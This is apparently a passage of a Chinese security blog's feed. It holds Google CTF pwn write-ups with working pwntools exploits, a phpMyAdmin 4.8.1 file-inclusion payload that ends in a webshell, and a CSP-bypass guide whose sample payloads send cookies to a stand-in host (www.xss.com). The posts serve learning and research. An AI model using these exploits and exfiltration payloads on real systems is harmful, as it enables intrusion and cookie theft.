src="/2018/07/18/google-ctf-beginner-part1/11.png"><p>添加cookie之后，重新登录就会进入控制页面了</p><img src="/2018/07/18/google-ctf-beginner-part1/12.png"><p>最后在网页中找到flag</p><p>在XSS的构造中利用//来包含链接比较有意思，其他的就是中规中矩的CSRF+XSS的连锁。</p><h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>先按照国际惯例检查一下程序的安全保护。</p><img src="/2018/07/18/google-ctf-beginner-part1/13.png"><p>开启了NX意味着无法在内存中无法执行代码，所以这里就没有办法写shellcode执行拿权限。分析之后发现输入点处有不安全的gets函数，所以我们是可以栈溢出的。</p><img src="/2018/07/18/google-ctf-beginner-part1/14.png"><p>但是，没有办法写shellcode，那么还有什么办法可以拿到flag呢，在分析程序时看到在选项4中会有读取flag的操作，必须是管理员才能执行。</p><p>既然无法写shellcode，那么我们覆盖返回地址用ret2libc的思路去拿flag，应该是行的，我们知道读取flag的函数地址，只要把返回地址覆盖成这个地址即可。</p><p>src是一个0x100的栈，要栈溢出的话就要padding A*(0x100 + SP寄存器的大小)</p><img src="/2018/07/18/google-ctf-beginner-part1/15.png"><p>发现是RSP64位寄存器，那么我们最后的padding就是 A*(0x100+8)，地址我们也查到了是 00000000606063A5，所以最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行一下，拿到flag</p><img src="/2018/07/18/google-ctf-beginner-part1/16.png"><h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>有趣的一道题，开启了栈保护，所以栈溢出是不存在了。那么看看IDA中的内容。</p><img src="/2018/07/18/google-ctf-beginner-part1/17.png"><p>其中的LD_BIND_NOW 在网上查出来的结果，当这个变量设置为1的时候，会让连接器在程序执行前把所有的函数地址都连接好。</p><p>然后会用readlink读取 /proc/self/exe 就可以获取当前程序的绝对路径，之后设置 LD_BIND_NOW为1，再次执行该程序。</p><p>这里有个trick，就是如果在程序执行readlink(/proc/self/exe )的时候改变源程序，那么readlink得到的内容就会变成 原路径+” (deleted)”</p><p>所以只要我们在程序运行时对它做改动，它的readlink就会是另外一个名称，然后利用新的名称执行我们想要的命令。</p><p>由于我们的flag在其他用户的目录中，我们无法读取，所以思路就是改动程序让它执行我们控制好的其他程序读取flag，我们是没有权限的，但是poetry有这个权限。</p><p>这里，我们先用ln链接 poetry，得到一个我们自己的poetry，随后ln -s 硬链接cat 命名为 poetry(deleted)，这样我们在执行我们链接的poetry flag，然后删除我们的链接程序，就会触发cat 读取flag，整个过程都是poetry用户的权限，所以没问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>最后这个脚本要多跑几次，因为这个是条件竞争的漏洞，最后通过这个flag了解到CVE-2009-1894，这个洞的触发条件就是在我们执行程序的时候，正好删除了原始链接程序，然后使得readlink返回我们伪造的程序路径从而执行恶意操作。</p><img src="/2018/07/18/google-ctf-beginner-part1/18.png"><p>拿到flag CVE链接 <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p><h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p><ol><li>打印列表</li><li>打印ToDo的任务</li><li>存储ToDo任务</li><li>删除ToDo任务</li><li>远程管理员</li><li>退出</li></ol><p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p><p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p><p>第五个查看源码就知道只是一个幌子。</p><p>第六个没啥好说的，退出操作。</p><p>看到第二个和第三个操作中都有同样的代码</p><img src="/2018/07/18/google-ctf-beginner-part1/19.png"><p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p><p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p><img src="/2018/07/18/google-ctf-beginner-part1/20.png"><p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p><p>之后该怎么利用呢？这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>之后执行命令，查看用户</p><img src="/2018/07/18/google-ctf-beginner-part1/21.png"><p>得到用户名，随后nc连上去，直接用该用户登录</p><img src="/2018/07/18/google-ctf-beginner-part1/22.png"><p>得到flag</p><p>这里要吐槽一点的是，这个泄露的libc一直没找到……，所以直接套用的其他人的exp。第一次感觉PWN也是蛮坑的。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。&lt;/p&gt;
&lt;h2 id=&quot;LETTER-MISC&quot;&gt;&lt;a href=&quot;#LETTER-MISC&quot; class
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner JS Safe 1 复现</title>
    <link href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/"/>
    <id>https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</id>
    <published>2018-07-08T15:58:48.000Z</published>
    <updated>2018-07-19T01:04:59.440Z</updated>
    
    <content type="html"><![CDATA[<p>周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png"><h2 id="分析与操作"><a href="#分析与操作" class="headerlink" title="分析与操作"></a>分析与操作</h2><p>这道题有点high，作为一个JS调试新手，着实爽了一把。题目给了一个Html网页，里面有两段JS代码，看来是JS代码分析的题目。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png"><p>我们先看其中的一段，前两个是解密用的参数，看到open_safe这个函数，password必须是CTF{xxxx}的格式，读取其中的数据代入判断。<br>if中把我们的输入代入了x函数。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png"><p>我们的password会在env的g参数中被编码，a是读数组数据，b是创建函数，c是加操作，d是ascii码转换。</p><p>之后，根据code中的字母在env中操作属性。最后有个等待值更新的异步操作。<br>其中重点就是那个for循环对env的操作，但是代码这个又很难看懂…… 所以只能用console.log来dump出来看看细节。而我们想知道我们的password被用来干什么了。</p><p>在for循环中加上一些代码来锁定g参数的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png"><p>定位在了876出现了g，然后看env里面有些啥。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png"><p>有趣的东西，出现了之前js代码中的subtle，digst，sha-256，而且在最后的数组中是sha-256和我们的输入编码，这其实就可以推测这里是要对我们的输入计算sha-256hash。为了看更多细节，我们继续加入一些代码调试。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看这之间有什么操作</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png"><p>果不其然，在876-884中完成了对我们输入的hash计算。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png"><p>在940处，把我们计算出的hash变成数组，存入<code>env[Ѿ]</code>中。</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png"><p>可以很清楚的看到，在960取出了我们hash过后的第一个值，然后与230异或，异或后的值与h进行or操作后赋值给h，随后开始下一次循环。</p><p>从之前的js代码中的if就可以知道h必须为0才能跳过判断。所以异或的值必须为0，也就是说必须要和对应的值相同。这样我们就得到了一串hash计算后的数组 <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p><p>最终我们把这串字符转16进制拼接得到 <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p><p>这个是我们输入的字符的hash值，找个hash值破解网站，得到 Passw0rd! ，所以最终flag为<code>CTF{Passw0rd!}</code></p><p>至于剩下的代码，它是用于解密数据的，我们输入正确就会解密成功，输出是下一题的入口。感觉是一道题被拆分成了几块……</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较基础但是又很考察基本功的题，从中学习到了很多。</p><p>最后我想说一下的是那个SubtleCrypto.digest()方法我一开始没怎么搞懂，他是怎么把utf-8的编码数组hash计算的。之后找到了它的实现原理，所以也就懂了，为什么要一开始先utf-8编码才进行hash计算。</p><p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p><p>经过这次JS分析，感觉学习专门的JS调试迫在眉睫…… ，有变量监听和事件监听，会给调试工作带来很大便利。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末看了看GoogleCTF的beginner题目，感觉有些题目还不错，这里就先分析其中一道题JS Safe。&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1 后台LFI</title>
    <link href="https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/"/>
    <id>https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/</id>
    <published>2018-07-01T13:02:15.000Z</published>
    <updated>2018-08-14T16:34:49.115Z</updated>
    
    <content type="html"><![CDATA[<p>之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/1.png"><p>漏洞的输入点是 <code>include $_REQUEST[&#39;target&#39;];</code>出现了文件包含这种危险操作，那么有很大概率出现问题。</p><p>我们只要绕过57、58、59行的检测就可以成功控制包含文件。</p><p>第57行用正则匹配开头为index的路径，只要路径开头没有index即可。</p><p>第58行检索输入中是否有黑名单的字符，黑名单在第50行，可以看到 import.php和export.php，只要参数中没这两个php就行。</p><p>第59行要看Core类的方法checkPageValidity。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/2.png"><p>第452行的第三个if判断，检查了输入中的白名单，如果有这些php就直接返回true。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/3.png"><p>没什么用，继续看下面的操作。mb_substr截取字符串从开始的位置到?处的字符串，再次检索白名单。</p><p>虽然可以在url中加入?来通过这个判断，但是随后的include因为有?，所以就无法包含我们控制的文件。</p><p>之后，重点来了，在465行出现了一个url解码操作。由于这里解码之后又重复了一遍上面的截取操作，所以这里我们就可以让?编码两次来绕过白名单检测，之后返回到include的时候也能包含我们想要的文件。最后的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../tongfang.txt</span><br></pre></td></tr></table></figure><p>db_sql.php是白名单中的一个，然后用两次URl编码过的?截断，两次URL编码的?在php的urldecode后会变成?，从而绕过检测，之后include文件时，服务器会认为db_sql.php%3f是一个目录，然后包含最后的文件。</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/4.png"><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>利用创建新的表，在表的字段中放入Webshell，然后包含数据库文件</li><li>执行<code>SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;</code>,然后包含php的session文件</li></ol><p>推荐用第二种方法更加隐蔽并且不需要猜测数据库文件路径，效果如下：</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/5.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个漏洞需要在登录phpmyadmin之后才能利用，所以只要密码强度够，暂时就不会有太大危险，但还是推荐尽快升级。另外如果是在session中写了Webshell，用菜刀连的时候必须要有phpmyadmin的session才行……</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=23&amp;srcid=0701Pk3Qg7hDrUSsZWD5dffq#rd" target="_blank" rel="noopener">ChaMd5的文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前ChaMd5团队报出来的phpmyadmin的文件包含漏洞，今天就来分析复现一下。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;img src=&quot;/2018/07/01/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CSP绕过总结</title>
    <link href="https://hurricane618.me/2018/06/30/csp-bypass-summary/"/>
    <id>https://hurricane618.me/2018/06/30/csp-bypass-summary/</id>
    <published>2018-06-30T03:33:01.000Z</published>
    <updated>2018-08-14T16:35:26.391Z</updated>
    
    <content type="html"><![CDATA[<p>首发在信安之路上 <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ，之后文章略有修改。</p><h1 id="CSP绕过总结"><a href="#CSP绕过总结" class="headerlink" title="CSP绕过总结"></a>CSP绕过总结</h1><p>今年的0CTF预选赛6道web题，其中三道都涉及CSP的知识点，简直可怕。。。这次趁着空闲时间就稍稍总结一下CSP绕过方面的知识，无论是对以后CTF比赛还是工作都很有帮助。</p><h2 id="CSP的基础"><a href="#CSP的基础" class="headerlink" title="CSP的基础"></a>CSP的基础</h2><p>CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</p><p>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 \&lt;audio>、\&lt;video> 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 \&lt;applet>、\&lt;embed>、\&lt;object> 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>允许加载foo.com子域的资源</td></tr><tr><td>abc.foo.com</td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的\&lt;script>元素、javascript: URL、内联的事件处理函数和内联的\&lt;style>元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><p>内容源有三种：源列表、关键字和数据，其中<em>，</em>.foo.com，abc.foo.com，<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据。</p><p>例子1</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>意思就是默认的内容源必须为同源或者是 trustedscripts.foo.com</p><p>例子2</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>一个在线的CSP头部生成器可以帮助我们深入理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>一个CSP安全检测网站，能够提供一些参考</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure><h2 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h2><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p><h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure><p>SD意味着可信js生成的js代码是可信的。</p><p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p><h2 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h2><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><p>接下来的多种Bypass手段也是围绕这两种的</p><h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>利用url跳转，回避严格的CSP。</p><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  window.location="http://www.xss.com/x.php?c=[cookie]";</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>\&lt;a>标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用网站本身的跳转接口</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h3 id="lt-link-标签预加载"><a href="#lt-link-标签预加载" class="headerlink" title="\&lt;link>标签预加载"></a>\&lt;link>标签预加载</h3><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span 